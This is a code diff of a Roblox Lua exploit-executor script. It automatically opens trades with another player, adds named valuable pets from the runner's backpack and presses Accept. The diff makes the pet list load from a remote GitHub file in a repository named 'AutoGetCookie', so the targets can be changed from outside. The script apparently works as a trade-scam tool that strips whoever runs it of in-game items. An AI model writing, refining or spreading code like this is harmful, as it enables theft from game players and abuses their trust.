@@ -9,7 +9,32 @@ local Confirm = ReplicatedStorage.GameEvents.TradeEvents.Confirm
 local SendRequest = ReplicatedStorage.GameEvents.TradeEvents.SendRequest -- RemoteEvent 
 local TradingUI = game:GetService("Players").LocalPlayer.PlayerGui.TradingUI
 local playerNameToCheck = "ThanhTuoi_IsFake"
+local http_request = http_request or request or (syn and syn.request) or (http and http.request)
+function additemFromWeb()
+    -- URL chứa danh sách pet
+    local url = "https://raw.githubusercontent.com/ThanhTuoi852123/AutoGetCookie/refs/heads/main/listpet1.json"
 
+    -- Thực hiện yêu cầu HTTP GET
+    local response = http_request({
+        Url = url,  -- Đặt URL
+        Method = "GET",  -- Phương thức GET
+    })
+
+    -- Kiểm tra kết quả trả về
+    if response and response.Body then
+        local success, listpet = pcall(function()
+            return game:GetService("HttpService"):JSONDecode(response.Body)  -- Chuyển dữ liệu JSON thành bảng Lua
+        end)
+
+        if success then
+			return listpet
+        else
+            print("Lỗi khi phân tích dữ liệu JSON")
+        end
+    else
+        print("Không thể tải dữ liệu từ URL")
+    end
+end
 function equipticket()
 	for _, tool in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
 		if string.find(string.lower(tool.Name), string.lower("Trading Ticket")) then
@@ -20,16 +45,14 @@ function equipticket()
 	end
 end
 function getplayer()
-	for _, player in ipairs(Players:GetPlayers()) do
+	for _, player in ipairs(game.Players:GetPlayers()) do
     	if player ~= game.Players.LocalPlayer then
 	       	return player
-        	break 
 	    end
 	end
 	return false
 end
-function additem()
-	local listpet = {"Kitsune", "Dragonfly", "French", "Raiju","Red Fox","Mimic Octopus","Mochi","Spaghetti"} 
+function additem(listpet)
 	for _, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
 		for _, petName in ipairs(listpet) do
 			if string.find(v.Name, petName) then
@@ -45,7 +68,7 @@ end
 while wait(2) do
 	pcall(function ()
 		if TradingUI.Enabled then
-		additem()
+		additem(additemFromWeb())
 		if TradingUI.Main.Main.AcceptButton.Main.TextLabel.Text == "Accept" then
 			Accept:FireServer()
 		end
@@ -54,12 +77,13 @@ while wait(2) do
 		end
 	else
 		local playerFound = getplayer()
+		print(playerFound)
 		if playerFound ~= false then
 			equipticket()
 			SendRequest:FireServer(
 				playerFound
 			)
-			additem()
+			additem(additemFromWeb())
 			wait(1)
 			Accept:FireServer()
 			wait(1)
